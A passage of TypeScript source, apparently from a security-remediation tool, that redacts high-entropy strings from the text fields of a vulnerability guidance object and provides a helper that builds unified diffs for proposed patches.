    if (typeof s !== "string" || s.length === 0) return s;
    return s.replace(HIGH_ENTROPY_RUN, (m) => redact(m));
  };

  return {
    ...guidance,
    explanation: sweep(guidance.explanation),
    exploitScenario: sweep(guidance.exploitScenario),
    impact: {
      business: sweep(guidance.impact.business),
      technical: sweep(guidance.impact.technical),
    },
    severityReasoning: sweep(guidance.severityReasoning),
    recommendation: sweep(guidance.recommendation),
    codeGuidance: sweep(guidance.codeGuidance),
    patch: {
      ...guidance.patch,
      description: sweep(guidance.patch.description),
    },
    prDescription: sweep(guidance.prDescription),
    verification: {
      automated: guidance.verification.automated.map(sweep),
      manual: guidance.verification.manual.map(sweep),
    },
  };
}

// ---------------------------------------------------------------------------
// Internal helper exposed for the tool layer
// ---------------------------------------------------------------------------

/**
 * Render a unified diff between the original file contents and a proposed
 * modified version. Returns the empty string when `modified` equals
 * `original` or is undefined. This is the single place we hand `diff`
 * the contents, so callers do not need to import the `diff` library
 * themselves.
 */
export function buildUnifiedDiff(
  repoPath: string,
  original: string,
  modified: string | undefined,
): string {
  if (modified === undefined) return "";
  if (modified === original) return "";
  return createPatch(repoPath, original, modified, "before", "after", {
    context: 3,
  });
}
